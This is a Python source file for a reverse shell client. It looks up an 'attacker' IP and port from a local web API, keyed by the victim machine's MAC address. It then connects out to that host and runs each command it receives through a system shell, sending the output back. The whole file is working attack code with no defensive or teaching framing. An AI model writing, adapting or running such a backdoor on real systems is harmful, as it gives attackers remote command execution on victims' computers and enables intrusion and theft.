import json
import subprocess
import requests
import socket
import uuid
import sys
import re
import os


class Client(object):

    def __init__(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Change directory to 'Desktop'.
        # os.chdir(os.path.join(os.environ["HOMEPATH"], "Desktop")) #TODO Fix this.

    @staticmethod
    def get_mac_address():
        # joins elements of getnode() after each 2 digits.
        # using regex expression
        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))

    def connect_to_attacker(self):
        mac_address = self.get_mac_address()
        response = requests.get(
            f'http://127.0.0.1:8000/reverse_shell/api/attackers/get_attacker/?mac_address={mac_address}')
        while response.status_code != 200:
            response = requests.get(
                f'http://127.0.0.1:8000/reverse_shell/api/attackers/get_attacker/?mac_address={mac_address}')
        attacker = json.loads(response.text)
        attacker_ip = attacker['ip']
        attacker_port = attacker['port']
        self.client.connect((attacker_ip, attacker_port))

    def main(self):
        self.connect_to_attacker()
        while True:
            data = self.client.recv(1024).decode('utf-8')
            if data == 'quit':
                print("quitting...")
                self.client.close()
                sys.exit()
            if data[:2] == 'cd':
                os.chdir(data[3:])
            if len(data) > 0:
                command = subprocess.Popen(
                    data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                )
                output_bytes = command.stdout.read()
                output_str = str(output_bytes, "utf-8")
                self.client.send(str.encode(str(os.getcwd()) + '$ ' + output_str))


if __name__ == '__main__':
    client = Client()
    client.main()
